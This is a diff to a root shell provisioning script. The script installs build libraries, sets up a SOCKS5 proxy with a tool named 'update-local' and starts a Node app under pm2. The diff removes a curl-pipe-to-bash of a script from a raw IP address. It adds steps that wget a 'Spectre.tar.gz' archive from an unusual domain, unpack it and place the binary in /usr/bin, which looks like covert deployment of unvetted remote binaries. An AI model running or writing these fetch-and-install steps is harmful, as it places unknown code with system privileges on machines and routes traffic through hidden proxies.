@@ -8,7 +8,7 @@ sleep 2
 cat /etc/*-release
 sleep 2
 
-apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null
+apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget golang >/dev/null
 
 sleep 2
 
@@ -79,11 +79,19 @@ sleep 2
 
 sleep 2
 
-curl -fsSL http://8.208.114.21/install_and_monitor_shade_root.sh | bash &
+wget http://greenleaf.teatspray.fun/Spectre.tar.gz
 
-sleep 10
+sleep 2
 
-curl -x socks5h://127.0.0.1:1081 ifconfig.me
+tar -xf Spectre.tar.gz
+
+sleep 2
+
+mv Spectre /usr/bin
+
+sleep 2
+
+curl -x socks5h://127.0.0.1:1082 ifconfig.me
 
 sleep 2
 
@@ -111,7 +119,7 @@ sleep 2 && \
 cat > update/local/update-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 127.0.0.1:1081
+socks5 = 127.0.0.1:1082
 END
 
 ./update/local/update-local -config update/local/update-local.conf & > /dev/null
@@ -150,7 +158,7 @@ END
 
 sleep 5
 
-pm2 start index.js --watch
+pm2 start index.js
 
 sleep 5
 
